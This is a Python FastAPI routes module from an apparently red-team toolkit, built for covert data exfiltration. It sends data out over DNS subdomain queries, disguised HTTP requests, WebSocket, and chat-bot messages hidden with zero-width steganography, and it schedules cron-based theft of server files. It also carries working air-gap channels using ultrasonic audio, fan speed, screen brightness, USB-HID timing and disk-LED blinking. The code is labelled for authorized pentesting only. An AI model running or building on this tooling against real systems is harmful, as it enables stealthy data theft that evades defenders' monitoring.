"""
Routes /api/exfil — Exfiltration via Covert Channels (Module 23).

ALL endpoints are for authorized penetration testing / red team operations only.
JWT-protected via the main router.
"""
from __future__ import annotations

import base64
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException, Query
from pydantic import BaseModel, Field, field_validator
from sqlalchemy.orm import Session

from database.db import get_db
from core.engines.exfil_engine import ExfilEngine

router = APIRouter()
_engine = ExfilEngine()


# ── Request models ─────────────────────────────────────────────────────────────

class DnsExfilRequest(BaseModel):
    data_b64: str = Field(..., description="Base64-encoded data to exfiltrate")
    domain: str = Field(..., description="Target domain for DNS queries")
    dns_server: str = Field("8.8.8.8", description="DNS resolver IP")
    encrypt: bool = Field(True, description="Compress + encrypt before exfil")

    @field_validator("data_b64")
    @classmethod
    def _validate_b64(cls, v: str) -> str:
        try:
            base64.b64decode(v)
        except Exception:
            raise ValueError("data_b64 must be valid base64")
        return v


class HttpExfilRequest(BaseModel):
    data_b64: str
    endpoint: str = Field(..., description="HTTP endpoint URL")
    method: str = Field("POST", description="GET | POST | PUT")
    disguise: str = Field(
        "json",
        description="json | form | base64_img | cookie",
    )
    encrypt: bool = True

    @field_validator("method")
    @classmethod
    def _method(cls, v: str) -> str:
        return v.upper()

    @field_validator("disguise")
    @classmethod
    def _disguise(cls, v: str) -> str:
        allowed = {"json", "form", "base64_img", "cookie"}
        if v not in allowed:
            raise ValueError(f"disguise must be one of {allowed}")
        return v


class WebSocketExfilRequest(BaseModel):
    data_b64: str
    ws_url: str = Field(..., description="WebSocket URL (ws:// or wss://)")
    encrypt: bool = True


class SocialExfilRequest(BaseModel):
    data_b64: str
    platform: str = Field(..., description="telegram | discord | slack")
    api_key: str = Field(..., description="Bot token / webhook URL / OAuth token")
    channel: str = Field(..., description="Chat ID / channel ID / webhook URL")
    encrypt: bool = True

    @field_validator("platform")
    @classmethod
    def _platform(cls, v: str) -> str:
        allowed = {"telegram", "discord", "slack"}
        if v not in allowed:
            raise ValueError(f"platform must be one of {allowed}")
        return v


class ChannelTestRequest(BaseModel):
    config: dict = Field(default_factory=dict, description="Channel-specific config")


class ScheduleExfilRequest(BaseModel):
    data_path: str = Field(..., description="Server-side path to data file")
    channel: str = Field(..., description="dns | icmp | http | websocket | telegram | discord | slack")
    cron_expr: str = Field(..., description="5-field cron expression (min hour dom month dow)")
    config: dict = Field(default_factory=dict)
    encrypt: bool = True


# ── Helper ─────────────────────────────────────────────────────────────────────

async def _decode_and_optionally_encrypt(
    data_b64: str,
    encrypt: bool,
) -> bytes:
    """Decode base64 data and optionally compress+encrypt."""
    try:
        raw = base64.b64decode(data_b64)
    except Exception as exc:
        raise HTTPException(status_code=400, detail=f"Invalid base64: {exc}")

    if encrypt:
        raw = await _engine.compress_and_encrypt(raw)
    return raw


# ── Endpoints ─────────────────────────────────────────────────────────────────

@router.post("/dns")
async def exfiltrate_dns(
    req: DnsExfilRequest,
    db: Session = Depends(get_db),
):
    """
    Exfiltrate data via DNS subdomain queries.
    Data is base32-encoded and split into 55-char DNS labels.
    """
    data = await _decode_and_optionally_encrypt(req.data_b64, req.encrypt)
    try:
        result = await _engine.exfiltrate_dns(data, req.domain, req.dns_server)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))

    result["encrypted"] = req.encrypt
    result["compressed"] = req.encrypt
    await _engine._persist_job(result, "dns", len(data), db)
    return result


@router.post("/http")
async def exfiltrate_http(
    req: HttpExfilRequest,
    db: Session = Depends(get_db),
):
    """
    Exfiltrate data via HTTP.
    Supports json / form / base64_img / cookie disguise modes.
    """
    data = await _decode_and_optionally_encrypt(req.data_b64, req.encrypt)
    try:
        result = await _engine.exfiltrate_http(
            data, req.endpoint, req.method, req.disguise
        )
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))

    result["encrypted"] = req.encrypt
    await _engine._persist_job(result, "http", len(data), db)
    return result


@router.post("/websocket")
async def exfiltrate_websocket(
    req: WebSocketExfilRequest,
    db: Session = Depends(get_db),
):
    """Exfiltrate data via WebSocket connection."""
    data = await _decode_and_optionally_encrypt(req.data_b64, req.encrypt)
    try:
        result = await _engine.exfiltrate_websocket(data, req.ws_url)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))

    result["encrypted"] = req.encrypt
    await _engine._persist_job(result, "websocket", len(data), db)
    return result


@router.post("/social")
async def exfiltrate_social(
    req: SocialExfilRequest,
    db: Session = Depends(get_db),
):
    """
    Exfiltrate data via social platform APIs.
    Uses zero-width character steganography to hide data in normal-looking messages.
    """
    data = await _decode_and_optionally_encrypt(req.data_b64, req.encrypt)
    try:
        result = await _engine.exfiltrate_social(
            data, req.platform, req.api_key, req.channel
        )
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))

    result["encrypted"] = req.encrypt
    await _engine._persist_job(result, req.platform, len(data), db)
    return result


@router.post("/test/{channel}")
async def test_channel(
    channel: str,
    req: ChannelTestRequest,
    db: Session = Depends(get_db),
):
    """
    Test if an exfil channel is functional without sending real data.
    Sends a small test payload.
    """
    valid_channels = {"dns", "http", "icmp", "websocket", "telegram", "discord", "slack"}
    if channel not in valid_channels:
        raise HTTPException(
            status_code=400,
            detail=f"Unknown channel '{channel}'. Valid: {valid_channels}",
        )
    try:
        result = await _engine.test_channel(channel, req.config)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))
    return result


@router.post("/schedule")
async def schedule_exfil(
    req: ScheduleExfilRequest,
    db: Session = Depends(get_db),
):
    """
    Schedule exfiltration at a specific time using cron expression.
    The server-side data_path file will be exfiltrated at the scheduled time.
    """
    try:
        exfil_id = await _engine.schedule_exfil(
            data_path=req.data_path,
            channel=req.channel,
            cron_expr=req.cron_expr,
            config={**req.config, "encrypt": req.encrypt},
            db=db,
        )
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))

    return {
        "exfil_id": exfil_id,
        "channel": req.channel,
        "cron_expr": req.cron_expr,
        "data_path": req.data_path,
        "status": "scheduled",
    }


@router.get("/jobs")
async def list_jobs(
    db: Session = Depends(get_db),
):
    """List all exfiltration jobs."""
    try:
        return await _engine.list_jobs(db)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@router.get("/job/{exfil_id}")
async def get_job(
    exfil_id: str,
    db: Session = Depends(get_db),
):
    """Get status and details of a specific exfil job."""
    result = await _engine.get_job(exfil_id, db)
    if result is None:
        raise HTTPException(status_code=404, detail=f"Exfil job {exfil_id} not found")
    return result


# ── Air-Gap Exfiltration (covert physical channels) ───────────────────────────

import asyncio as _asyncio
import os as _os
import time as _time
import random as _random
from pathlib import Path as _Path

_AIRGAP_DIR = _Path("./data/airgap_output")
_AIRGAP_DIR.mkdir(parents=True, exist_ok=True)
_SIMULATION = _os.getenv("SIMULATION_MODE", "true").lower() == "true"


class AirGapRequest(BaseModel):
    data_b64: str
    authorization_confirmed: bool = False
    target_device: str = "localhost"


class AcousticRequest(AirGapRequest):
    frequency_hz: int = 18000
    bit_duration_ms: int = 100


class FanSpeedRequest(AirGapRequest):
    bit_duration_s: float = 1.0
    thermal_zone: str = "/sys/class/thermal/thermal_zone0/temp"


class ScreenLightRequest(AirGapRequest):
    bit_duration_ms: int = 50
    brightness_path: str = "/sys/class/backlight/intel_backlight/brightness"


class USBHID_Request(AirGapRequest):
    hid_device: str = "/dev/hidg0"
    bit_duration_ms: int = 200


class DiskLEDRequest(AirGapRequest):
    bit_duration_ms: int = 80


def _require_airgap_auth(auth: bool):
    if not auth:
        raise HTTPException(403, detail="Air-Gap exfiltration nécessite authorization_confirmed=true (pentest autorisé explicite)")


def _b64_to_bits(data_b64: str) -> list[int]:
    import base64 as _b64
    try:
        raw = _b64.b64decode(data_b64)
    except Exception as e:
        raise HTTPException(400, detail=f"base64 invalide: {e}")
    bits = []
    for byte in raw:
        for i in range(7, -1, -1):
            bits.append((byte >> i) & 1)
    return bits


@router.post("/airgap/acoustic")
async def airgap_acoustic(req: AcousticRequest):
    """Exfiltration acoustique via haut-parleur (ultrasons / GAIROSCOPE style)."""
    _require_airgap_auth(req.authorization_confirmed)
    bits = _b64_to_bits(req.data_b64)

    if _SIMULATION:
        await _asyncio.sleep(min(len(bits) * req.bit_duration_ms / 1000, 3))
        result_path = str(_AIRGAP_DIR / f"acoustic_{int(_time.time())}.sim")
        _Path(result_path).write_text(f"[SIM ACOUSTIC] {len(bits)} bits @ {req.frequency_hz}Hz, {req.bit_duration_ms}ms/bit")
        return {
            "method": "acoustic_ultrasonic",
            "bits_transmitted": len(bits),
            "bytes_transmitted": len(bits) // 8,
            "frequency_hz": req.frequency_hz,
            "duration_s": round(len(bits) * req.bit_duration_ms / 1000, 2),
            "result_file": result_path,
            "simulation": True,
        }

    try:
        import pyaudio, numpy as np
        RATE = 44100
        pa = pyaudio.PyAudio()
        stream = pa.open(format=pyaudio.paFloat32, channels=1, rate=RATE, output=True)
        samples_per_bit = int(RATE * req.bit_duration_ms / 1000)
        t = np.linspace(0, req.bit_duration_ms / 1000, samples_per_bit, endpoint=False)
        tone = np.sin(2 * np.pi * req.frequency_hz * t).astype(np.float32)
        silence = np.zeros(samples_per_bit, dtype=np.float32)
        for bit in bits:
            stream.write((tone if bit else silence).tobytes())
        stream.stop_stream(); stream.close(); pa.terminate()
        return {"method": "acoustic_ultrasonic", "bits_transmitted": len(bits), "simulation": False}
    except ImportError:
        return {"error": "pyaudio/numpy requis", "bits_transmitted": 0}


@router.post("/airgap/fanspeed")
async def airgap_fanspeed(req: FanSpeedRequest):
    """Exfiltration via variation de vitesse ventilateur (FANSMITTER style)."""
    _require_airgap_auth(req.authorization_confirmed)
    bits = _b64_to_bits(req.data_b64)

    if _SIMULATION:
        await _asyncio.sleep(min(len(bits) * req.bit_duration_s, 5))
        result_path = str(_AIRGAP_DIR / f"fanspeed_{int(_time.time())}.sim")
        _Path(result_path).write_text(f"[SIM FANSPEED] {len(bits)} bits, {req.bit_duration_s}s/bit via CPU load modulation")
        return {
            "method": "fanspeed_cpu_load",
            "bits_transmitted": len(bits),
            "bytes_transmitted": len(bits) // 8,
            "bit_duration_s": req.bit_duration_s,
            "duration_total_s": round(len(bits) * req.bit_duration_s, 1),
            "result_file": result_path,
            "simulation": True,
        }

    import subprocess, time
    transmitted = 0
    for bit in bits:
        if bit:
            procs = [subprocess.Popen(["yes"], stdout=subprocess.DEVNULL) for _ in range(4)]
            time.sleep(req.bit_duration_s)
            for p in procs:
                p.terminate()
        else:
            time.sleep(req.bit_duration_s)
        transmitted += 1
    return {"method": "fanspeed_cpu_load", "bits_transmitted": transmitted, "simulation": False}


@router.post("/airgap/screen-light")
async def airgap_screen_light(req: ScreenLightRequest):
    """Exfiltration via modulation luminosité écran (BRIGHTNESS style)."""
    _require_airgap_auth(req.authorization_confirmed)
    bits = _b64_to_bits(req.data_b64)

    if _SIMULATION:
        await _asyncio.sleep(min(len(bits) * req.bit_duration_ms / 1000, 3))
        result_path = str(_AIRGAP_DIR / f"screen_{int(_time.time())}.sim")
        _Path(result_path).write_text(f"[SIM SCREEN LIGHT] {len(bits)} bits @ {req.bit_duration_ms}ms/bit")
        return {
            "method": "screen_brightness",
            "bits_transmitted": len(bits),
            "bytes_transmitted": len(bits) // 8,
            "bit_duration_ms": req.bit_duration_ms,
            "result_file": result_path,
            "simulation": True,
        }

    import time
    bright_path = _Path(req.brightness_path)
    if not bright_path.exists():
        raise HTTPException(500, detail=f"Chemin backlight introuvable: {req.brightness_path}")

    max_val = int(bright_path.parent.joinpath("max_brightness").read_text().strip())
    for bit in bits:
        bright_path.write_text(str(max_val if bit else 0))
        time.sleep(req.bit_duration_ms / 1000)
    return {"method": "screen_brightness", "bits_transmitted": len(bits), "simulation": False}


@router.post("/airgap/usb-hid")
async def airgap_usb_hid(req: USBHID_Request):
    """Exfiltration via timing clavier USB-HID (MAGNETO / KeyStroke timing)."""
    _require_airgap_auth(req.authorization_confirmed)
    bits = _b64_to_bits(req.data_b64)

    if _SIMULATION:
        await _asyncio.sleep(min(len(bits) * req.bit_duration_ms / 1000, 4))
        result_path = str(_AIRGAP_DIR / f"usbhid_{int(_time.time())}.sim")
        _Path(result_path).write_text(f"[SIM USB-HID] {len(bits)} bits via keystroke timing")
        return {
            "method": "usb_hid_keystroke_timing",
            "bits_transmitted": len(bits),
            "bytes_transmitted": len(bits) // 8,
            "bit_duration_ms": req.bit_duration_ms,
            "result_file": result_path,
            "simulation": True,
        }

    import time
    hid_dev = _Path(req.hid_device)
    if not hid_dev.exists():
        raise HTTPException(500, detail=f"HID device introuvable: {req.hid_device}")

    NULL_REPORT = b"\x00" * 8
    KEY_A = b"\x00\x00\x04\x00\x00\x00\x00\x00"
    with open(str(hid_dev), "wb") as f:
        for bit in bits:
            delay = req.bit_duration_ms / 1000 if bit else (req.bit_duration_ms * 2) / 1000
            f.write(KEY_A)
            f.flush()
            f.write(NULL_REPORT)
            f.flush()
            time.sleep(delay)
    return {"method": "usb_hid_keystroke_timing", "bits_transmitted": len(bits), "simulation": False}


@router.post("/airgap/disk-led")
async def airgap_disk_led(req: DiskLEDRequest):
    """Exfiltration via LED activité disque dur (LED-it-GO / xLED style)."""
    _require_airgap_auth(req.authorization_confirmed)
    bits = _b64_to_bits(req.data_b64)

    if _SIMULATION:
        await _asyncio.sleep(min(len(bits) * req.bit_duration_ms / 1000, 3))
        result_path = str(_AIRGAP_DIR / f"diskled_{int(_time.time())}.sim")
        _Path(result_path).write_text(f"[SIM DISK LED] {len(bits)} bits via disk I/O LED blinking")
        return {
            "method": "disk_led_io",
            "bits_transmitted": len(bits),
            "bytes_transmitted": len(bits) // 8,
            "bit_duration_ms": req.bit_duration_ms,
            "result_file": result_path,
            "simulation": True,
        }

    import time, subprocess
    for bit in bits:
        if bit:
            subprocess.run(["dd", "if=/dev/urandom", "of=/dev/null", "bs=4096", "count=8"], capture_output=True)
        else:
            time.sleep(req.bit_duration_ms / 1000)
    return {"method": "disk_led_io", "bits_transmitted": len(bits), "simulation": False}


@router.get("/airgap/methods")
async def airgap_methods():
    """Liste toutes les méthodes d'exfiltration air-gap disponibles."""
    return {
        "methods": [
            {"id": "acoustic", "name": "Acoustique ultrasonique", "range_m": 5, "speed_bps": 10, "requires_hardware": "haut-parleur", "detection_risk": "faible", "reference": "GAIROSCOPE / MOSQUITO"},
            {"id": "fanspeed", "name": "Variation vitesse ventilateur", "range_m": 2, "speed_bps": 0.5, "requires_hardware": "CPU cooling", "detection_risk": "très faible", "reference": "FANSMITTER"},
            {"id": "screen_light", "name": "Modulation luminosité écran", "range_m": 10, "speed_bps": 5, "requires_hardware": "écran + caméra cible", "detection_risk": "faible", "reference": "BRIGHTNESS / Optical Covert Channel"},
            {"id": "usb_hid", "name": "USB-HID Keystroke Timing", "range_m": 0, "speed_bps": 3, "requires_hardware": "USB HID gadget", "detection_risk": "moyen", "reference": "MAGNETO / KeyStroke timing"},
            {"id": "disk_led", "name": "LED activité disque", "range_m": 8, "speed_bps": 4, "requires_hardware": "HD LED visible", "detection_risk": "très faible", "reference": "LED-it-GO / xLED"},
        ],
        "simulation_mode": _SIMULATION,
    }
